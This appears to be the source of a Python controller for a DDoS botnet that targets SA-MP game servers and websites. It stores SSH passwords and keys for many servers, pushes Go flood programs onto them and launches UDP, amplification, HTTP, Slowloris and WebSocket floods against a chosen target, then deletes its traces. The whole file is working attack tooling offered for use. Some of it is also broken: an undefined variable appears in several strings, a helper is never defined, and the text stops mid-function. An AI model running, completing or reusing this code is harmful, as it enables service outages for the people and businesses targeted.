#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import time
import threading
import subprocess
from datetime import datetime
import re
import socket
import select
import random

# ================= [ KONFIGURASI ] =================
DB_FILE = "servers.json"
DEFAULT_KEY_FILE = os.path.expanduser("~/.ssh/id_rsa")

COLOR = {
    'red': '\033[91m',
    'green': '\033[92m',
    'yellow': '\033[93m',
    'blue': '\033[94m',
    'purple': '\033[95m',
    'cyan': '\033[96m',
    'white': '\033[97m',
    'reset': '\033[0m',
    'bold': '\033[1m'
}

# Auto-install paramiko kalau belum ada
try:
    import paramiko
except ImportError:
    print(f"{COLOR['yellow']}[*] Installing paramiko...{COLOR['reset']}")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "paramiko", "-q"])
    import paramiko

# ================= [ DATABASE ] =================
def load_servers():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                data = json.load(f)
                # Ensure structure
                if 'stats' not in data:
                    data['stats'] = {}
                if 'total_attacks' not in data['stats']:
                    data['stats']['total_attacks'] = 0
                if 'total_packets' not in data['stats']:
                    data['stats']['total_packets'] = 0
                if 'total_requests' not in data['stats']:
                    data['stats']['total_requests'] = 0
                if 'total_bytes' not in data['stats']:
                    data['stats']['total_bytes'] = 0
                if 'total_time' not in data['stats']:
                    data['stats']['total_time'] = 0
                if 'servers_password' not in data:
                    data['servers_password'] = []
                if 'servers_key' not in data:
                    data['servers_key'] = []
                if 'proxies' not in data:
                    data['proxies'] = []
                if 'l7_stats' not in data:
                    data['l7_stats'] = {'http_2xx': 0, 'http_4xx': 0, 'http_5xx': 0, 'failed': 0}
                return data
        except:
            pass
    return {
        "servers_password": [],
        "servers_key": [],
        "proxies": [],
        "stats": {
            "total_attacks": 0,
            "total_packets": 0,
            "total_requests": 0,
            "total_bytes": 0,
            "total_time": 0
        },
        "l7_stats": {
            "http_2xx": 0,
            "http_4xx": 0,
            "http_5xx": 0,
            "failed": 0
        }
    }

def save_servers(data):
    temp = DB_FILE + ".tmp"
    with open(temp, 'w') as f:
        json.dump(data, f, indent=2)
    os.replace(temp, DB_FILE)

# ================= [ SSH EXECUTION ] =================
def execute_ssh(server, command, timeout=60):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        connect_args = {
            'hostname': server['host'],
            'port': server.get('port', 22),
            'username': server['username'],
            'timeout': 10,
            'allow_agent': False,
            'look_for_keys': False
        }
        
        if server.get('auth_type') == 'key':
            key_file = server.get('key_file', DEFAULT_KEY_FILE)
            if os.path.exists(key_file):
                try:
                    pkey = paramiko.RSAKey.from_private_key_file(key_file)
                except:
                    try:
                        pkey = paramiko.Ed25519Key.from_private_key_file(key_file)
                    except:
                        pkey = paramiko.ECDSAKey.from_private_key_file(key_file)
                connect_args['pkey'] = pkey
            else:
                raise Exception(f"Private key not found: {key_file}")
        else:
            connect_args['password'] = server['password']
        
        ssh.connect(**connect_args)
        stdin, stdout, stderr = ssh.exec_command(command, timeout=timeout, get_pty=True)
        output = stdout.read().decode('utf-8', errors='ignore')
        error = stderr.read().decode('utf-8', errors='ignore')
        ssh.close()
        
        if error and not output:
            return f"ERROR: {error}"
        return output + error
        
    except Exception as e:
        return f"ERROR: {str(e)}"

# ================= [ L4 FUNCTIONS (ORIGINAL) ] =================
def test_server(server):
    """Test server untuk L4 (attack.go)"""
    print(f"{COLOR['yellow']}🔄 Testing {server['host']} (L4)...{COLOR['reset']}")
    
    result = execute_ssh(server, "echo OK")
    if "ERROR" in result:
        print(f"{COLOR['red']}❌ SSH Failed: {result[:50]}{COLOR['reset']}")
        return False
    
    sys_check = 'echo "CPU:$(nproc)"; echo "RAM:$(free -m | grep Mem | awk \'{print $2}\')"; echo "LOAD:$(uptime | awk -F\'load average:\' \'{print $2}\')"'
    result = execute_ssh(server, sys_check)
    lines = result.split('\n')
    
    for line in lines:
        if line.startswith('CPU:'):
            server['cpu_cores'] = int(line.split(':')[1])
        elif line.startswith('RAM:'):
            server['ram_mb'] = int(line.split(':')[1])
    
    # Check Go
    check_go = 'export PATH=$PATH:/usr/local/go/bin; go version 2>/dev/null || echo "GO_NOT_FOUND"'
    result = execute_ssh(server, check_go)
    
    if "GO_NOT_FOUND" in result:
        print(f"{COLOR['yellow']}⚠️  Installing Go...{COLOR['reset']}")
        install_cmd = (
            'cd /tmp && wget -q https://go.dev/dl/go1.21.0.linux-amd64.tar.gz && '
            'tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz && '
            'rm -f go1.21.0.linux-amd64.tar.gz && '
            'ln -sf /usr/local/go/bin/go /usr/local/bin/go 2>/dev/null; '
            'export PATH=$PATH:/usr/local/go/bin; go version'
        )
        result = execute_ssh(server, install_cmd, timeout=120)
        if "go version" not in result:
            print(f"{COLOR['red']}❌ Go installation failed{COLOR['reset']}")
            server['active'] = False
            return False
    
    server['active'] = True
    server['l4_capable'] = True
    print(f"{COLOR['green']}✅ L4 Ready | CPU:{server.get('cpu_cores', '?')} cores{COLOR['reset']}")
    return True

def generate_go_script(target_ip, target_port, duration, method, threads):
    try:
        with open('attack.go', 'r') as f:
            template = f.read()
        
        script = template.replace('{{.TargetIP}}', target_ip)
        script = script.replace('{{.TargetPort}}', str(target_port))
        script = script.replace('{{.Duration}}', str(duration))
        script = script.replace('{{.Threads}}', str(threads))
        script = script.replace('{{.Method}}', method.upper())
        return script
    except Exception as e:
        print(f"{COLOR['red']}❌ Error reading attack.go: {e}{COLOR['reset']}")
        sys.exit(1)

def deploy_attack(servers, target_ip, target_port, duration, method, threads):
    print(f"\n{COLOR['cyan']}{COLOR['bold']}⚔️  DEPLOYING L4 TO {len(servers)} SERVERS{COLOR['reset']}")
    print(f"🎯 Target: {target_ip}:{target_port} | Method: {method} | Duration: {duration}s")
    
    go_script = generate_go_script(target_ip, target_port, duration, method, threads)
    
    total_packets = 0
    total_bytes = 0
    success_count = 0
    failed_count = 0
    start_time_all = time.time()
    
    def attack_server(server, index):
        nonlocal total_packets, total_bytes, success_count, failed_count
        
        cmd = f'''mkdir -p /tmp/l4attack && cd /tmp/l4attack
cat > attack.go << 'ENDOFFILE'
{go_script}
ENDOFFILE
export PATH=$PATH:/usr/local/go/bin:/usr/local/bin
go build -ldflags="-s -w" -o attack attack.go 2>&1
if [ -f attack ]; then
    chmod +x attack
    nice -n -20 ./attack
    rm -f attack attack.go
    echo "ATTACK_COMPLETE"
else
    echo "BUILD_FAILED"
fi
rm -rf /tmp/l4attack'''
        
        output = execute_ssh(server, cmd, timeout=duration+60)
        
        pkt = 0
        byt = 0
        
        match = re.search(r'TOTAL PACKETS:\s+([\d.]+[KMBT]?)', output)
        if match:
            pkt = parse_number(match.group(1))
            total_packets += pkt
        
        match = re.search(r'TOTAL DATA:\s+([\d.]+)\s+MB', output)
        if match:
            byt = float(match.group(1)) * 1024 * 1024
            total_bytes += int(byt)
        
        if pkt > 0:
            success_count += 1
            print(f"{COLOR['green']}✅ Server {index+1}: {server['host']} | Packets: {format_number(pkt)}{COLOR['reset']}")
        else:
            failed_count += 1
            print(f"{COLOR['red']}❌ Server {index+1}: {server['host']} | Failed{COLOR['reset']}")
    
    threads_list = []
    for i, server in enumerate(servers):
        t = threading.Thread(target=attack_server, args=(server, i))
        t.start()
        threads_list.append(t)
        time.sleep(0.2)
    
    for t in threads_list:
        t.join()
    
    # Update stats
    data = load_servers()
    data['stats']['total_attacks'] += 1
    data['stats']['total_packets'] += total_packets
    data['stats']['total_bytes'] += total_bytes
    data['stats']['total_time'] += time.time() - start_time_all
    save_servers(data)
    
    print(f"\n{COLOR['cyan']}{COLOR['bold']}=== L4 RESULT ==={COLOR['reset']}")
    print(f"Success: {success_count}/{len(servers)}")
    print(f"Total Packets: {format_number(total_packets)}")
    print(f"Total Data: {total_bytes/1024/1024/1024:.2f} GB")

# ================= [ L7 FUNCTIONS (NEW) ] =================
def test_server_l7(server):
    """Test server untuk L7 (attackl7.go) dengan auto-install modules"""
    print(f"{COLOR['yellow']}🔄 Testing {server['host']} (L7)...{COLOR['reset']}")
    
    result = execute_ssh(server, "echo OK")
    if "ERROR" in result:
        print(f"{COLOR['red']}❌ SSH Failed{COLOR['reset']}")
        return False
    
    sys_check = 'echo "CPU:$(nproc)"; echo "RAM:$(free -m | grep Mem | awk \'{print $2}\')"'
    result = execute_ssh(server, sys_check)
    lines = result.split('\n')
    for line in lines:
        if line.startswith('CPU:'):
            server['cpu_cores'] = int(line.split(':')[1])
    
    # Check Go
    check_go = 'export PATH=$PATH:/usr/local/go/bin; go version 2>/dev/null || echo "GO_NOT_FOUND"'
    result = execute_ssh(server, check_go)
    
    if "GO_NOT_FOUND" in result:
        print(f"{COLOR['yellow']}⚠️  Installing Go...{COLOR['reset']}")
        install_cmd = (
            'cd /tmp && wget -q https://go.dev/dl/go1.21.0.linux-amd64.tar.gz && '
            'tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz && '
            'ln -sf /usr/local/go/bin/go /usr/local/bin/go 2>/dev/null; '
            'export PATH=$PATH:/usr/local/go/bin; go version'
        )
        result = execute_ssh(server, install_cmd, timeout=120)
        if "go version" not in result:
            print(f"{COLOR['red']}❌ Go install failed{COLOR['reset']}")
            return False
    
    # Install L7 modules
    print(f"{COLOR['cyan']}📦 Installing L7 modules...{COLOR['reset']}")
    mod_cmd = (
        'export PATH=$PATH:/usr/local/go/bin && '
        'export GOPROXY=https://proxy.golang.org,direct && '
        'mkdir -p /tmp/gomod && cd /tmp/gomod && '
        'go mod init temp 2>/dev/null || true && '
        'go get golang.org/x/net/http2@latest 2>&1 | tail -1 && '
        'go get golang.org/x/net/proxy@latest 2>&1 | tail -1 && '
        'go get github.com/gorilla/websocket@latest 2>&1 | tail -1 && '
        'rm -rf /tmp/gomod && echo "MODULES_OK"'
    )
    result = execute_ssh(server, mod_cmd, timeout=90)
    
    if "MODULES_OK" in result:
        print(f"{COLOR['green']}✅ Modules installed{COLOR['reset']}")
    
    server['active'] = True
    server['l7_capable'] = True
    print(f"{COLOR['green']}✅ L7 Ready | CPU:{server.get('cpu_cores', '?')} cores{COLOR['reset']}")
    return True

def generate_l7_script(target_url, duration, method, threads):
    try:
        with open('attackl7.go', 'r') as f:
            template = f.read()
        
        script = template.replace('{{.TargetURL}}', target_url)
        script = script.replace('{{.Duration}}', str(duration))
        script = script.replace('{{.Threads}}', str(threads))
        script = script.replace('{{.Method}}', method.upper())
        return script
    except Exception as e:
        print(f"{COLOR['red']}❌ Error reading attackl7.go: {e}{COLOR['reset']}")
        return None

def deploy_attack_l7(servers, target_url, duration, method, threads, data):
    print(f"\n{COLOR['purple']}{COLOR['bold']}⚔️  DEPLOYING L7 TO {len(servers)} SERVERS{COLOR['reset']}")
    print(f"🎯 Target: {target_url} | Method: {method} | Duration: {duration}s")
    
    go_script = generate_l7_script(target_url, duration, method, threads)
    if not go_script:
        return
    
    # Upload proxies
    proxies = data.get('proxies', [])
    proxy_content = '\n'.join([p['url'] for p in proxies if p.get('active')][:500])
    
    total_requests = 0
    total_bytes = 0
    success_count = 0
    start_time = time.time()
    
    def attack_server(server, index):
        nonlocal total_requests, total_bytes, success_count
        
        # Upload script & proxy
        setup = 'mkdir -p /tmp/l7attack && rm -f /tmp/l7attack/*'
        execute_ssh(server, setup)
        
        # Upload via SFTP
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            connect_args = {
                'hostname': server['host'],
                'port': server.get('port', 22),
                'username': server['username'],
                'timeout': 10,
                'allow_agent': False,
                'look_for_keys': False
            }
            if server.get('auth_type') == 'key':
                key_file = server.get('key_file', DEFAULT_KEY_FILE)
                try:
                    pkey = paramiko.RSAKey.from_private_key_file(key_file)
                except:
                    try:
                        pkey = paramiko.Ed25519Key.from_private_key_file(key_file)
                    except:
                        pkey = paramiko.ECDSAKey.from_private_key_file(key_file)
                connect_args['pkey'] = pkey
            else:
                connect_args['password'] = server['password']
            
            ssh.connect(**connect_args)
            sftp = ssh.open_sftp()
            
            with sftp.file('/tmp/l7attack/attack.go', 'w') as f:
                f.write(go_script)
            
            if proxy_content:
                with sftp.file('/tmp/l7attack/proxy.txt', 'w') as f:
                    f.write(proxy_content)
            
            sftp.close()
            ssh.close()
        except Exception as e:
            print(f"{COLOR['red']}❌ Server {index+1}: Upload failed{COLOR['reset']}")
            return
        
        # Compile & Run
        cmd = (
            'export PATH=$PATH:/usr/local/go/bin && '
            'cd /tmp/l7attack && '
            'go mod init attack 2>/dev/null || true && '
            'go get golang.org/x/net/http2@latest 2>&1 >/dev/null && '
            'go get github.com/gorilla/websocket@latest 2>&1 >/dev/null && '
            'go build -ldflags="-s -w" -o attack attack.go 2>&1; '
            'if [ -f attack ]; then '
            'ulimit -n 65535; nice -n -20 ./attack; '
            'rm -f attack attack.go proxy.txt; '
            'echo "ATTACK_COMPLETE"; '
            'fi'
        )
        
        output = execute_ssh(server, cmd, timeout=duration+60)
        
        req = 0
        byt = 0
        
        match = re.search(r'TOTAL REQUESTS:\s+([\d.]+[KMBT]?)', output)
        if match:
            req = parse_number(match.group(1))
            total_requests += req
        
        match = re.search(r'TOTAL DATA:\s+([\d.]+)\s+MB', output)
        if match:
            byt = float(match.group(1)) * 1024 * 1024
            total_bytes += int(byt)
        
        if req > 0:
            success_count += 1
            print(f"{COLOR['green']}✅ Server {index+1}: {server['host']} | Requests: {format_number(req)}{COLOR['reset']}")
        else:
            print(f"{COLOR['red']}❌ Server {index+1}: {server['host']} | Failed{COLOR['reset']}")
        
        execute_ssh(server, 'rm -rf /tmp/l7attack')
    
    ths = []
    for i, server in enumerate(servers):
        t = threading.Thread(target=attack_server, args=(server, i))
        t.start()
        ths.append(t)
        time.sleep(0.2)
    
    for t in ths:
        t.join()
    
    data['stats']['total_attacks'] += 1
    data['stats']['total_requests'] += total_requests
    data['stats']['total_bytes'] += total_bytes
    data['stats']['total_time'] += time.time() - start_time
    save_servers(data)
    
    print(f"\n{COLOR['purple']}{COLOR['bold']}=== L7 RESULT ==={COLOR['reset']}")
    print(f"Success: {success_count}/{len(servers)}")
    print(f"Total Requests: {format_number(total_requests)}")
    print(f"Total Data: {total_bytes/1024/1024/1024:.2f} GB")

# ================= [ MENU FUNCTIONS ] =================
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    banner = f"""
{COLOR['red']}{COLOR['bold']}
╔════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                ║
║                      🔥 SAMP BOTNET ULTIMATE EDITION v30 🔥                                    ║
║               PASSWORD + SSH KEY DUAL MANAGEMENT - GOD MODE                                    ║
║                         L4 (UDP) + L7 (HTTP/WS) HYBRID                                         ║
╚════════════════════════════════════════════════════════════════════════════════════════════════╝
{COLOR['reset']}
    """
    print(banner)

def menu_manage_servers(data):
    while True:
        clear_screen()
        print_banner()
        
        print(f"{COLOR['cyan']}📌 SERVER MANAGEMENT{COLOR['reset']}")
        print(f"{COLOR['green']}1️⃣  Manage Password Servers (L4 - UDP/SAMP){COLOR['reset']}")
        print(f"{COLOR['blue']}2️⃣  Manage SSH Key Servers (L4 - UDP/SAMP){COLOR['reset']}")
        print(f"{COLOR['green']}3️⃣  Manage Password Servers (L7 - HTTP/WS){COLOR['reset']}")
        print(f"{COLOR['blue']}4️⃣  Manage SSH Key Servers (L7 - HTTP/WS){COLOR['reset']}")
        print(f"{COLOR['yellow']}5️⃣  Manage Proxies (for L7){COLOR['reset']}")
        print("6️⃣  Back to Main Menu")
        
        choice = input(f"\n{COLOR['yellow']}Pilih: {COLOR['reset']}")
        
        if choice == '1':
            menu_password_servers(data, 'l4')
        elif choice == '2':
            menu_key_servers(data, 'l4')
        elif choice == '3':
            menu_password_servers(data, 'l7')
        elif choice == '4':
            menu_key_servers(data, 'l7')
        elif choice == '5':
            menu_proxies(data)
        elif choice == '6':
            break

def menu_password_servers(data, mode='l4'):
    while True:
        clear_screen()
        print_banner()
        print(f"{COLOR['green']}🔒 PASSWORD SERVERS [{mode.upper()}]{COLOR['reset']}\n")
        
        pwd_servers = data.get('servers_password', [])
        if not pwd_servers:
            print("No password servers configured.\n")
        else:
            active = len([s for s in pwd_servers if s.get('active')])
            print(f"{COLOR['bold']}Active: {active} | Total: {len(pwd_servers)}{COLOR['reset']}\n")
            for i, s in enumerate(pwd_servers, 1):
                status = "✅" if s.get('active', False) else "⏳"
                cap = ""
                if mode == 'l4':
                    cap = f"{COLOR['cyan']}L4{D}{COLOR['reset']}" if s.get('l4_capable') else "--"
                else:
                    cap = f"{COLOR['purple']}L7{D}{COLOR['reset']}" if s.get('l7_capable') else "--"
                print(f"{status} {i}. {s['host']} - {s['username']} [{cap}]")
        
        print(f"\n{COLOR['cyan']}Options:{COLOR['reset']}")
        print("1️⃣  Add Server")
        print("2️⃣  Bulk Add from File")
        print("3️⃣  Remove Server")
        print("4️⃣  Test Server")
        print("5️⃣  Test All Servers")
        print("6️⃣  Back")
        
        choice = input(f"\n{COLOR['yellow']}Pilih: {COLOR['reset']}")
        
        if choice == '1':
            host = input("Host/IP: ")
            username = input("Username: ")
            password = input("Password: ")
            port = input("Port SSH (22): ") or "22"
            
            server = {
                'host': host,
                'username': username,
                'password': password,
                'port': int(port),
                'auth_type': 'password',
                'added': time.time(),
                'active': False
            }
            data['servers_password'].append(server)
            save_servers(data)
            print(f"{COLOR['green']}✅ Added{COLOR['reset']}")
            time.sleep(1)
            
        elif choice == '2':
            file_path = input("Path ke file (host:port:user:pass): ")
            try:
                with open(file_path, 'r') as f:
                    count = 0
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            parts = line.split(':')
                            if len(parts) >= 4:
                                data['servers_password'].append({
                                    'host': parts[0],
                                    'port': int(parts[1]),
                                    'username': parts[2],
                                    'password': ':'.join(parts[3:]),
                                    'auth_type': 'password',
                                    'added': time.time(),
                                    'active': False
                                })
                                count += 1
                save_servers(data)
                print(f"{COLOR['green']}✅ {count} servers added{COLOR['reset']}")
            except Exception as e:
                print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
            time.sleep(2)
            
        elif choice == '3':
            if pwd_servers:
                try:
                    idx = int(input("Number: ")) - 1
                    if 0 <= idx < len(pwd_servers):
                        del data['servers_password'][idx]
                        save_servers(data)
                        print(f"{COLOR['green']}✅ Removed{COLOR['reset']}")
                except:
                    pass
            time.sleep(1)
            
        elif choice == '4':
            if pwd_servers:
                try:
                    idx = int(input("Number: ")) - 1
                    if 0 <= idx < len(pwd_servers):
                        if mode == 'l4':
                            test_server(pwd_servers[idx])
                        else:
                            test_server_l7(pwd_servers[idx])
                        save_servers(data)
                    input("\nEnter...")
                except:
                    pass
                    
        elif choice == '5':
            if pwd_servers:
                print(f"\n{COLOR['yellow']}Testing all...{COLOR['reset']}")
                for s in pwd_servers:
                    if mode == 'l4':
                        test_server(s)
                    else:
                        test_server_l7(s)
                    save_servers(data)
                input("\nEnter...")
                
        elif choice == '6':
            break

def menu_key_servers(data, mode='l4'):
    global DEFAULT_KEY_FILE
    while True:
        clear_screen()
        print_banner()
        print(f"{COLOR['blue']}🔑 SSH KEY SERVERS [{mode.upper()}]{COLOR['reset']}\n")
        
        key_servers = data.get('servers_key', [])
        if not key_servers:
            print("No SSH key servers configured.\n")
        else:
            active = len([s for s in key_servers if s.get('active')])
            print(f"{COLOR['bold']}Active: {active} | Total: {len(key_servers)}{COLOR['reset']}\n")
            for i, s in enumerate(key_servers, 1):
                status = "✅" if s.get('active', False) else "⏳"
                cap = ""
                if mode == 'l4':
                    cap = f"{COLOR['cyan']}L4{D}{COLOR['reset']}" if s.get('l4_capable') else "--"
                else:
                    cap = f"{COLOR['purple']}L7{D}{COLOR['reset']}" if s.get('l7_capable') else "--"
                print(f"{status} {i}. {s['host']} [{cap}]")
        
        print(f"\n{COLOR['cyan']}Options:{COLOR['reset']}")
        print("1️⃣  Add Server")
        print("2️⃣  Bulk Add from File")
        print("3️⃣  Remove Server")
        print("4️⃣  Test Server")
        print("5️⃣  Test All Servers")
        print("6️⃣  Set Global Private Key Path")
        print("7️⃣  Back")
        
        choice = input(f"\n{COLOR['yellow']}Pilih: {COLOR['reset']}")
        
        if choice == '1':
            host = input("Host/IP: ")
            username = input("Username: ")
            key_file = input(f"Key path [{DEFAULT_KEY_FILE}]: ") or DEFAULT_KEY_FILE
            port = input("Port (22): ") or "22"
            
            data['servers_key'].append({
                'host': host,
                'username': username,
                'key_file': key_file,
                'port': int(port),
                'auth_type': 'key',
                'added': time.time(),
                'active': False
            })
            save_servers(data)
            print(f"{COLOR['green']}✅ Added{COLOR['reset']}")
            time.sleep(1)
            
        elif choice == '2':
            file_path = input("Path (host:port:user:key_path): ")
            try:
                with open(file_path, 'r') as f:
                    count = 0
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            parts = line.split(':')
                            if len(parts) >= 4:
                                data['servers_key'].append({
                                    'host': parts[0],
                                    'port': int(parts[1]),
                                    'username': parts[2],
                                    'key_file': ':'.join(parts[3:]),
                                    'auth_type': 'key',
                                    'added': time.time(),
                                    'active': False
                                })
                                count += 1
                save_servers(data)
                print(f"{COLOR['green']}✅ {count} servers added{COLOR['reset']}")
            except Exception as e:
                print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
            time.sleep(2)
            
        elif choice == '3':
            if key_servers:
                try:
                    idx = int(input("Number: ")) - 1
                    if 0 <= idx < len(key_servers):
                        del data['servers_key'][idx]
                        save_servers(data)
                        print(f"{COLOR['green']}✅ Removed{COLOR['reset']}")
                except:
                    pass
            time.sleep(1)
            
        elif choice == '4':
            if key_servers:
                try:
                    idx = int(input("Number: ")) - 1
                    if 0 <= idx < len(key_servers):
                        if mode == 'l4':
                            test_server(key_servers[idx])
                        else:
                            test_server_l7(key_servers[idx])
                        save_servers(data)
                    input("\nEnter...")
                except:
                    pass
                    
        elif choice == '5':
            if key_servers:
                print(f"\n{COLOR['yellow']}Testing all...{COLOR['reset']}")
                for s in key_servers:
                    if mode == 'l4':
                        test_server(s)
                    else:
                        test_server_l7(s)
                    save_servers(data)
                input("\nEnter...")
                
        elif choice == '6':
            new_key = input(f"Key path [{DEFAULT_KEY_FILE}]: ") or DEFAULT_KEY_FILE
            DEFAULT_KEY_FILE = new_key
            print(f"{COLOR['green']}✅ Updated{COLOR['reset']}")
            time.sleep(1)
            
        elif choice == '7':
            break

def menu_proxies(data):
    while True:
        clear_screen()
        print_banner()
        print(f"{COLOR['yellow']}🌐 PROXY MANAGEMENT (for L7){COLOR['reset']}\n")
        
        proxies = data.get('proxies', [])
        print(f"Total: {len(proxies)} | Active: {len([p for p in proxies if p.get('active')])}\n")
        
        print("1️⃣  Load from File")
        print("2️⃣  Add Single Proxy")
        print("3️⃣  Remove Dead Proxies")
        print("4️⃣  Back")
        
        choice = input(f"\n{COLOR['yellow']}Pilih: {COLOR['reset']}")
        
        if choice == '1':
            path = input("File (ip:port per line): ")
            if os.path.exists(path):
                with open(path, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and ':' in line:
                            if not line.startswith('http'):
                                line = f"http://{line}"
                            data['proxies'].append({
                                'url': line,
                                'active': True,
                                'added': time.time()
                            })
                save_servers(data)
                print(f"{COLOR['green']}✅ Loaded{COLOR['reset']}")
            time.sleep(1)
            
        elif choice == '2':
            proxy = input("Proxy (ip:port): ")
            if ':' in proxy:
                if not proxy.startswith('http'):
                    proxy = f"http://{proxy}"
                data['proxies'].append({
                    'url': proxy,
                    'active': True,
                    'added': time.time()
                })
                save_servers(data)
                print(f"{COLOR['green']}✅ Added{COLOR['reset']}")
            time.sleep(1)
            
        elif choice == '3':
            data['proxies'] = [p for p in proxies if p.get('active')]
            save_servers(data)
            print(f"{COLOR['green']}✅ Cleaned{COLOR['reset']}")
            time.sleep(1)
            
        elif choice == '4':
            break

def menu_launch_attack(data):
    clear_screen()
    print_banner()
    
    pwd_active = [s for s in data.get('servers_password', []) if s.get('active', False)]
    key_active = [s for s in data.get('servers_key', []) if s.get('active', False)]
    
    if not pwd_active and not key_active:
        print(f"{COLOR['red']}❌ No active servers!{COLOR['reset']}")
        input("\nEnter...")
        return
    
    print(f"{COLOR['cyan']}🎯 LAUNCH ATTACK{COLOR['reset']}")
    print(f"🔒 Password: {len(pwd_active)} | 🔑 Key: {len(key_active)}")
    
    print(f"\n{COLOR['bold']}Select Layer:{COLOR['reset']}")
    print("1️⃣  L4 Attack (UDP/SAMP) - attack.go")
    print("2️⃣  L7 Attack (HTTP/WebSocket) - attackl7.go")
    
    layer = input(f"\n{COLOR['yellow']}Pilih: {COLOR['reset']}")
    
    if layer == '1':
        launch_l4(data, pwd_active, key_active)
    elif layer == '2':
        launch_l7(data, pwd_active, key_active)

def launch_l4(data, pwd_active, key_active):
    print(f"\n{COLOR['cyan']}Select Pool:{COLOR['reset']}")
    print("1️⃣  Password Only")
    print("2️⃣  SSH Key Only")
    print("3️⃣  ALL")
    
    ch = input("Choice: ")
    if ch == '1':
        servers = pwd_active
    elif ch == '2':
        servers = key_active
    else:
        servers = pwd_active + key_active
    
    if not servers:
        return
    
    try:
        target_ip = input("Target IP: ")
        target_port = int(input("Port (7777): ") or "7777")
        duration = int(input("Duration (s): ") or "60")
        
        print(f"\n1.UDP  2.SAMP  3.MIX  4.AMPLIFY  5.GOD")
        methods = {'1': 'UDP', '2': 'SAMP', '3': 'MIX', '4': 'AMPLIFY', '5': 'GOD'}
        method = methods.get(input("Method: "), 'GOD')
        
        avg_cpu = sum([s.get('cpu_cores', 2) for s in servers]) / len(servers)
        suggested = int(avg_cpu * 500)
        threads = int(input(f"Threads/server [{suggested}]: ") or str(suggested))
        
        if input(f"\n{COLOR['red']}Start? (y/n): {COLOR['reset']}").lower() == 'y':
            deploy_attack(servers, target_ip, target_port, duration, method, threads)
            input(f"\n{COLOR['green']}Press Enter...{COLOR['reset']}")
    except Exception as e:
        print(f"{COLOR['red']}Error: {e}{COLOR['reset']}")
        input()

def launch_l7(data, pwd_active, key_active):
    print(f"\n{COLOR['cyan']}Select Pool:{COLOR['reset']}")
    print("1️⃣  Password Only")
    print("2️⃣  SSH Key Only")
    print("3️⃣  ALL")
    
    ch = input("Choice: ")
    if ch == '1':
        servers = [s for s in pwd_active if s.get('l7_capable')]
    elif ch == '2':
        servers = [s for s in key_active if s.get('l7_capable')]
    else:
        servers = [s for s in pwd_active + key_active if s.get('l7_capable')]
    
    if not servers:
        print(f"{COLOR['red']}❌ No L7 capable servers! Test servers first (L7 mode).{COLOR['reset']}")
        input()
        return
    
    try:
        url = input("Target URL: ")
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        duration = int(input("Duration (s): ") or "60")
        
        print(f"\n1.HTTP_FLOOD  2.HTTP2_RAPID  3.SLOWLORIS  4.WEBSOCKET  5.POST_FLOOD  6.GOD_L7")
        methods = {
            '1': 'HTTP_FLOOD', '2': 'HTTP2_RAPID', '3': 'SLOWLORIS',
            '4': 'WEBSOCKET', '5': 'POST_FLOOD', '6': 'GOD_L7'
        }
        method = methods.get(input("Method: "), 'GOD_L7')
        
        avg_cpu = sum([s.get('cpu_cores', 2) for s in servers]) / len(servers)
        suggested = int(avg_cpu * 200)
        threads = int(input(f"Threads/server [{suggested}]: ") or str(suggested))
        
        if input(f"\n{COLOR['red']}Start? (y/n): {COLOR['reset']}").lower() == 'y':
            deploy_attack_l7(servers, url, duration, method, threads, data)
            input(f"\n{COLOR['green']}Press Enter...{COLOR['reset']}")
    except Exception as e:
        print(f"{COLOR['red']}Error: {e}{COLOR['reset']}")
        input()

def menu_batch_attack(data):
    active = [s for s in data.get('servers_password', []) if s.get('active')] + \
             [s for s in data.get('servers_key', []) if s.get('active')]
    
    if not active:
        print(f"{COLOR['red']}❌ No active servers!{COLOR['reset']}")
        input()
        return
    
    print(f"\n{COLOR['yellow']}Batch Attack{COLOR['reset']}")
    print("Format: L4:ip:port:duration:method or L7:url:duration:method")
    path = input("File: ")
    
    try:
        with open(path, 'r') as f:
            lines = f.readlines()
        
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            
            parts = line.split(':')
            if parts[0].upper() == 'L4' and len(parts) >= 5:
                ip, port, dur, method = parts[1], int(parts[2]), int(parts[3]), parts[4]
                avg_cpu = sum([s.get('cpu_cores', 2) for s in active]) / len(active)
                thr = int(avg_cpu * 500)
                deploy_attack(active, ip, port, dur, method, thr)
            elif parts[0].upper() == 'L7' and len(parts) >= 4:
                url = ':'.join(parts[1:-2])
                dur, method = int(parts[-2]), parts[-1]
                avg_cpu = sum([s.get('cpu_cores', 2) for s in active]) / len(active)
                thr = int(avg_cpu * 200)
                deploy_attack_l7(active, url, dur, method, thr, data)
            
            time.sleep(5)
    except Exception as e:
        print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
    
    input()

def menu_stats(data):
    clear_screen()
    print_banner()
    
    s = data['stats']
    l7 = data.get('l7_stats', {})
    
    print(f"{COLOR['cyan']}📊 STATISTICS{COLOR['reset']}")
    print(f"\nL4 (UDP/SAMP):")
    print(f"  Attacks: {s.get('total_attacks', 0)}")
    print(f"  Packets: {format_number(s.get('total_packets', 0))}")
    
    print(f"\nL7 (HTTP/WS):")
    print(f"  Requests: {format_number(s.get('total_requests', 0))}")
    print(f"  HTTP 2xx: {l7.get('http_2xx', 0)}")
    
    print(f"\nTotal Data: {s.get('total_bytes', 0)/1024/1024/1024:.2f} GB")
    
    pwd = len([s for s in data['servers_password'] if s.get('active')])
    key = len([s for s in data['servers_key'] if s.get('active')])
    print(f"\nActive: 🔒{pwd} 🔑{key}")
    
    input(f"\n{COLOR['green']}Press Enter...{COLOR['reset']}")

def format_number(n):
    if n < 1000:
